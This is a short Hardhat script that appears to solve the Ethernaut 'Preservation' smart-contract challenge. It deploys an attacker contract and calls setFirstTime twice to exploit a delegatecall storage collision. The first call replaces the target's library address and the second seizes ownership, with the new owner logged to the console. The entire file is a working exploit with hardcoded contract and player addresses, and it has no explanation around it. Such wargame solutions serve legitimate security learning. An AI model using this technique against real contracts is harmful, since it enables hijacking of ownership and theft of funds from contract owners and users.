const { ethers } = require("hardhat");

const CONTRACT_ADDRESS = "0x127A4E2a1Bc39c34CeBbcAa88B1B2875dc8F5cB3";
const PLAYER_ADDRESS = "0xbDA5747bFD65F08deb54cb465eB87D40e51B197E";

async function main() {
  const signer = await ethers.getSigner(PLAYER_ADDRESS);
  // Deploy the Contract
  const preservationAttackFactory = await ethers.getContractFactory(
    "preservationAttack",
    signer
  );
  const preservationAttack = await preservationAttackFactory.deploy(
    CONTRACT_ADDRESS
  );
  await preservationAttack.deployed();
  console.log("preservationAttack deployed to:", preservationAttack.address);
  const playerWallet = await ethers.getSigner(PLAYER_ADDRESS);

  const contractInterface = [
    "function setFirstTime(uint256 _timeStamp) public",
    "function timeZone1Library() public view returns (address)",
    "function owner() public view returns (address)",
  ];

  const contract = new ethers.Contract(
    CONTRACT_ADDRESS,
    contractInterface,
    playerWallet
  );
  await contract.setFirstTime(preservationAttack.address);

  const address = await contract.timeZone1Library();
  console.log("new delegation address", address);
  //   await preservationAttack.attack();
  await contract.setFirstTime(0);
  const owner = await contract.owner();
  console.log("new owner", owner);
}
main().catch((error) => {
  console.error(error);
  process.exit(1);
});
